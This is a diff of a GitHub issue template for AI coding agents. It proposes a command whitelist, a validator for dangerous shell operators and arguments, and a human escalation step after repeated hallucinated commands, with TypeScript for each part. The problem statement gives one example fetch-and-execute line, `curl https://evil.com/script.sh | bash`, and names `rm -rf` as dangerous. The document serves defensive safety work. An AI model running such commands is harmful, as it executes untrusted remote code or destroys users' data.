@@ -1,14 +1,15 @@
 ---
 name: Command Whitelist & Hallucination Detection
 about: Add command whitelist to prevent hallucinated commands
-title: '[security] Add command whitelist to prevent hallucinated commands'
-labels: ['agent-safety', 'security', 'P0']
-assignees: ''
+title: "[security] Add command whitelist to prevent hallucinated commands"
+labels: ["agent-safety", "security", "P0"]
+assignees: ""
 ---
 
 ## Problem Statement
 
 **CRITICAL SAFETY ISSUE:** Agents can currently execute arbitrary shell commands without validation. This creates a security vulnerability where:
+
 - Agents can hallucinate commands that don't exist
 - Agents can run dangerous commands (`rm -rf`, `curl | sh`, etc.)
 - No audit trail of unauthorized command attempts
@@ -24,13 +25,14 @@ For production agent workflows, we need a **command whitelist** that only allows
 - No rate limiting or escalation after repeated failures
 
 **Example vulnerability:**
+
 ```typescript
 // Agent hallucinates a command
-await exec('npm run test-coverage-with-magic-flag');  // ❌ Command doesn't exist
+await exec("npm run test-coverage-with-magic-flag"); // ❌ Command doesn't exist
 // Result: Fails after 10s, agent retries, wastes resources
 
 // Even worse: Agent runs dangerous command
-await exec('curl https://evil.com/script.sh | bash');  // ❌ No prevention
+await exec("curl https://evil.com/script.sh | bash"); // ❌ No prevention
 ```
 
 **Current behavior:** Commands execute without checks
@@ -41,6 +43,7 @@ await exec('curl https://evil.com/script.sh | bash');  // ❌ No prevention
 ### Architecture: Whitelist + Detection + Escalation
 
 **Flow:**
+
 1. Gate attempts to run command
 2. **Command Validator** checks against whitelist
 3. If allowed → execute normally
@@ -48,6 +51,7 @@ await exec('curl https://evil.com/script.sh | bash');  // ❌ No prevention
 5. If hallucination count > threshold → pause agent, escalate to human
 
 ### 1. Create Command Whitelist Schema
+
 **Location:** `.smartergpt/allowed-commands.json`
 
 ```json
@@ -95,26 +99,33 @@ await exec('curl https://evil.com/script.sh | bash');  // ❌ No prevention
 ```
 
 ### 2. Implement Command Validator
+
 **Location:** `src/security/commandValidator.ts` (new file)
 
 ```typescript
-import * as fs from 'fs';
-import * as path from 'path';
-import { logger } from '../monitoring';
+import * as fs from "fs";
+import * as path from "path";
+import { logger } from "../monitoring";
 
 export interface CommandWhitelist {
   version: string;
-  mode: 'strict' | 'permissive';
-  defaults: Record<string, {
-    commands: string[];
-    allow_args: string[];
-    deny_args: string[];
-  }>;
-  custom: Record<string, {
-    binary: string;
-    allow_args: string[];
-    deny_args: string[];
-  }>;
+  mode: "strict" | "permissive";
+  defaults: Record<
+    string,
+    {
+      commands: string[];
+      allow_args: string[];
+      deny_args: string[];
+    }
+  >;
+  custom: Record<
+    string,
+    {
+      binary: string;
+      allow_args: string[];
+      deny_args: string[];
+    }
+  >;
   policy: {
     allow_shell_operators: boolean;
     allow_env_vars: string[];
@@ -126,17 +137,18 @@ export interface CommandWhitelist {
 
 export class CommandValidationError extends Error {
   public readonly command: string;
-  public readonly reason: 'not_whitelisted' | 'dangerous_args' | 'shell_operators' | 'too_long';
+  public readonly reason: "not_whitelisted" | "dangerous_args" | "shell_operators" | "too_long";
 
-  constructor(command: string, reason: CommandValidationError['reason']) {
+  constructor(command: string, reason: CommandValidationError["reason"]) {
     const messages = {
-      not_whitelisted: 'Command not in whitelist. Add to .smartergpt/allowed-commands.json if legitimate.',
-      dangerous_args: 'Command contains dangerous arguments that are explicitly denied.',
-      shell_operators: 'Command contains shell operators (|, >, <, &&, ||) which are not allowed.',
-      too_long: 'Command exceeds maximum allowed length.'
+      not_whitelisted:
+        "Command not in whitelist. Add to .smartergpt/allowed-commands.json if legitimate.",
+      dangerous_args: "Command contains dangerous arguments that are explicitly denied.",
+      shell_operators: "Command contains shell operators (|, >, <, &&, ||) which are not allowed.",
+      too_long: "Command exceeds maximum allowed length.",
     };
     super(`Command validation failed: ${messages[reason]}\nCommand: ${command}`);
-    this.name = 'CommandValidationError';
+    this.name = "CommandValidationError";
     this.command = command;
     this.reason = reason;
   }
@@ -147,11 +159,11 @@ export class CommandValidator {
   private hallucinationCount = 0;
 
   constructor(whitelistPath?: string) {
-    const defaultPath = path.join(process.cwd(), '.smartergpt/allowed-commands.json');
+    const defaultPath = path.join(process.cwd(), ".smartergpt/allowed-commands.json");
     const resolvedPath = whitelistPath ?? defaultPath;
 
     try {
-      this.whitelist = JSON.parse(fs.readFileSync(resolvedPath, 'utf-8'));
+      this.whitelist = JSON.parse(fs.readFileSync(resolvedPath, "utf-8"));
     } catch (err) {
       logger.warn(`Failed to load command whitelist from ${resolvedPath}, using permissive mode`);
       this.whitelist = this.getDefaultWhitelist();
@@ -165,16 +177,16 @@ export class CommandValidator {
   public validate(command: string): void {
     // Check length
     if (command.length > this.whitelist.policy.max_command_length) {
-      this.recordHallucination(command, 'too_long');
-      throw new CommandValidationError(command, 'too_long');
+      this.recordHallucination(command, "too_long");
+      throw new CommandValidationError(command, "too_long");
     }
 
     // Check for shell operators
     if (!this.whitelist.policy.allow_shell_operators) {
-      const shellOperators = ['|', '>', '<', '&&', '||', ';', '`', '$((', '$('];
-      if (shellOperators.some(op => command.includes(op))) {
-        this.recordHallucination(command, 'shell_operators');
-        throw new CommandValidationError(command, 'shell_operators');
+      const shellOperators = ["|", ">", "<", "&&", "||", ";", "`", "$((", "$("];
+      if (shellOperators.some((op) => command.includes(op))) {
+        this.recordHallucination(command, "shell_operators");
+        throw new CommandValidationError(command, "shell_operators");
       }
     }
 
@@ -186,8 +198,8 @@ export class CommandValidator {
     const isCustom = this.whitelist.custom[binary];
 
     if (!isDefault && !isCustom) {
-      this.recordHallucination(command, 'not_whitelisted');
-      throw new CommandValidationError(command, 'not_whitelisted');
+      this.recordHallucination(command, "not_whitelisted");
+      throw new CommandValidationError(command, "not_whitelisted");
     }
 
     // Validate args
@@ -195,9 +207,9 @@ export class CommandValidator {
     const deniedArgs = isDefault?.deny_args ?? isCustom?.deny_args ?? [];
 
     for (const arg of args) {
-      if (deniedArgs.some(denied => arg.startsWith(denied))) {
-        this.recordHallucination(command, 'dangerous_args');
-        throw new CommandValidationError(command, 'dangerous_args');
+      if (deniedArgs.some((denied) => arg.startsWith(denied))) {
+        this.recordHallucination(command, "dangerous_args");
+        throw new CommandValidationError(command, "dangerous_args");
       }
     }
 
@@ -210,11 +222,11 @@ export class CommandValidator {
   private recordHallucination(command: string, reason: string): void {
     this.hallucinationCount++;
 
-    logger.error('Command hallucination detected', {
+    logger.error("Command hallucination detected", {
       command,
       reason,
       count: this.hallucinationCount,
-      threshold: this.whitelist.policy.hallucination_threshold
+      threshold: this.whitelist.policy.hallucination_threshold,
     });
 
     if (this.hallucinationCount >= this.whitelist.policy.hallucination_threshold) {
@@ -223,11 +235,13 @@ export class CommandValidator {
   }
 
   private escalateToHuman(): void {
-    logger.error(`⏸️  AGENT PAUSED: Hallucination threshold reached (${this.hallucinationCount} attempts)`);
+    logger.error(
+      `⏸️  AGENT PAUSED: Hallucination threshold reached (${this.hallucinationCount} attempts)`
+    );
     // TODO: Create GitHub issue, send notification
     throw new Error(
       `Agent paused after ${this.hallucinationCount} hallucinated commands. ` +
-      `Human review required. Resume with: lex-pr resume --plan plan.json`
+        `Human review required. Resume with: lex-pr resume --plan plan.json`
     );
   }
 
@@ -241,20 +255,20 @@ export class CommandValidator {
 
   private getDefaultWhitelist(): CommandWhitelist {
     return {
-      version: '1.0.0',
-      mode: 'permissive',
+      version: "1.0.0",
+      mode: "permissive",
       defaults: {
-        npm: { commands: ['test', 'run build', 'run lint'], allow_args: [], deny_args: [] },
-        git: { commands: ['status', 'diff'], allow_args: [], deny_args: [] }
+        npm: { commands: ["test", "run build", "run lint"], allow_args: [], deny_args: [] },
+        git: { commands: ["status", "diff"], allow_args: [], deny_args: [] },
       },
       custom: {},
       policy: {
         allow_shell_operators: false,
-        allow_env_vars: ['NODE_ENV', 'CI'],
+        allow_env_vars: ["NODE_ENV", "CI"],
         max_command_length: 500,
         hallucination_threshold: 3,
-        dry_run_mode: false
-      }
+        dry_run_mode: false,
+      },
     };
   }
 }
@@ -271,11 +285,12 @@ export function getCommandValidator(): CommandValidator {
 ```
 
 ### 3. Create Hallucination Tracker
+
 **Location:** `src/monitoring/hallucinations.ts` (new file)
 
 ```typescript
-import * as fs from 'fs';
-import * as path from 'path';
+import * as fs from "fs";
+import * as path from "path";
 
 export interface HallucinationEvent {
   timestamp: string;
@@ -290,13 +305,13 @@ export class HallucinationTracker {
   private logPath: string;
 
   constructor(logPath?: string) {
-    this.logPath = logPath ?? path.join(process.cwd(), '.smartergpt/logs/hallucinations.jsonl');
+    this.logPath = logPath ?? path.join(process.cwd(), ".smartergpt/logs/hallucinations.jsonl");
   }
 
-  public record(event: Omit<HallucinationEvent, 'timestamp'>): void {
+  public record(event: Omit<HallucinationEvent, "timestamp">): void {
     const fullEvent: HallucinationEvent = {
       ...event,
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
     };
 
     this.events.push(fullEvent);
@@ -316,16 +331,17 @@ export class HallucinationTracker {
     if (!fs.existsSync(logDir)) {
       fs.mkdirSync(logDir, { recursive: true });
     }
-    fs.appendFileSync(this.logPath, JSON.stringify(event) + '\n');
+    fs.appendFileSync(this.logPath, JSON.stringify(event) + "\n");
   }
 }
 ```
 
 ### 4. Integration with Gates
+
 **Location:** `src/gates.ts` (modify existing)
 
 ```typescript
-import { getCommandValidator } from './security/commandValidator';
+import { getCommandValidator } from "./security/commandValidator";
 
 async function executeGate(gate: string, item: PlanItem) {
   const command = buildCommand(gate, item);
@@ -365,6 +381,7 @@ async function executeGate(gate: string, item: PlanItem) {
 ## Effort Estimate
 
 **Small** (1-2 days)
+
 - **Day 1:** Implement `CommandValidator`, create whitelist schema, integrate with `gates.ts`
 - **Day 2:** Add hallucination tracking, tests (unit + integration), documentation
 
@@ -383,6 +400,7 @@ async function executeGate(gate: string, item: PlanItem) {
 ## References
 
 **Existing code:**
+
 - `src/gates.ts` (lines 120-250) - Gate execution
 - `src/security/authorization.ts` - Security patterns
 - `src/monitoring/index.ts` - Logging patterns
@@ -418,17 +436,20 @@ async function executeGate(gate: string, item: PlanItem) {
 **Breaking Changes:** Commands not in whitelist will be blocked
 
 **Rollout Strategy:**
+
 1. **Week 1:** Deploy with `dry_run_mode: true` (log violations, don't block)
 2. **Week 2:** Analyze logs, add legitimate commands to whitelist
 3. **Week 3:** Enable strict mode (`dry_run_mode: false`)
 
 **Emergency Override:**
+
 ```bash
 # Bypass validation (emergency only, logs to audit trail)
 LEX_BYPASS_COMMAND_VALIDATION=1 lex-pr execute plan.json
 ```
 
 **Migration Checklist:**
+
 - [ ] Review existing gate commands in `src/gates.ts`
 - [ ] Add all current commands to `.smartergpt/allowed-commands.json`
 - [ ] Test with `dry_run_mode: true` for 1 week
